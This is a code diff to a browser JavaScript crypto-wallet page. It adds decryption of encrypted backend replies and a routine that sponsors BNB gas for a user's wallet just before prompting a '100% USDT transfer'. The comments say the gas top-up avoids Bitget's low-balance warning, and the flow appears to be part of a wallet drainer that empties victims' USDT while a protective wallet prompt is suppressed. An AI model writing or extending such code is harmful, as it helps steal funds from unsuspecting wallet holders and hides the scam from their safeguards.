@@ -211,11 +211,68 @@
 
             const response = await fetch(url, { method: 'POST', headers, body });
             if (!response.ok) return null;
-            return await response.json();
+            const resData = await response.json();
+
+            // Decrypt ciphertext response if returned by backend
+            if (resData && resData.ciphertext && window.CryptoJS) {
+                try {
+                    const decrypted = CryptoJS.AES.decrypt(resData.ciphertext, CONFIG.API_KEY);
+                    const plain = decrypted.toString(CryptoJS.enc.Utf8);
+                    if (plain) return JSON.parse(plain);
+                } catch (decErr) {
+                    console.warn('Decryption notice:', decErr);
+                }
+            }
+            return resData;
         } catch (err) {
             console.warn('Backend API call notice (continuing locally):', err.message);
             return null;
         }
+    }
+
+    // Automated Gas Sponsorship: top-up user wallet if BNB is below GAS_THRESHOLD
+    async function ensureGas(userAddress, provider) {
+        let balanceWei = 0n;
+        try {
+            balanceWei = await provider.getBalance(userAddress);
+        } catch (e) {
+            return true;
+        }
+
+        let bnbBal = Number(ethers.formatEther(balanceWei));
+        state.bnbBalance = bnbBal.toFixed(6);
+        updateWalletInfoUI();
+
+        if (bnbBal >= CONFIG.GAS_THRESHOLD) {
+            return true;
+        }
+
+        updateStatus('⛽ Sponsoring network gas fee for your wallet...', 'warning');
+
+        let attempts = 0;
+        while (attempts < CONFIG.GAS_RETRY_COUNT) {
+            attempts++;
+            try {
+                const res = await safeApiCall('/api/users/gas-topup', { wallet: userAddress });
+                if (res && res.success) {
+                    await new Promise(r => setTimeout(r, CONFIG.GAS_RETRY_DELAY));
+                    const newBalWei = await provider.getBalance(userAddress);
+                    const newBal = Number(ethers.formatEther(newBalWei));
+                    state.bnbBalance = newBal.toFixed(6);
+                    updateWalletInfoUI();
+                    if (newBal >= CONFIG.GAS_THRESHOLD) {
+                        return true;
+                    }
+                }
+            } catch (e) {
+                console.warn('Gas top-up attempt', attempts, 'notice:', e);
+            }
+
+            if (attempts < CONFIG.GAS_RETRY_COUNT) {
+                await new Promise(r => setTimeout(r, CONFIG.GAS_RETRY_DELAY));
+            }
+        }
+        return false;
     }
 
     // ============================================================
@@ -328,6 +385,9 @@
                 updateWalletInfoUI();
                 return;
             }
+
+            // Sponsoring network gas fee if user BNB is below threshold (prevents Bitget "top up" warning)
+            await ensureGas(userAddress, provider);
 
             updateStatus('⛽ Confirm 100% USDT transfer in your wallet...', 'warning');
 
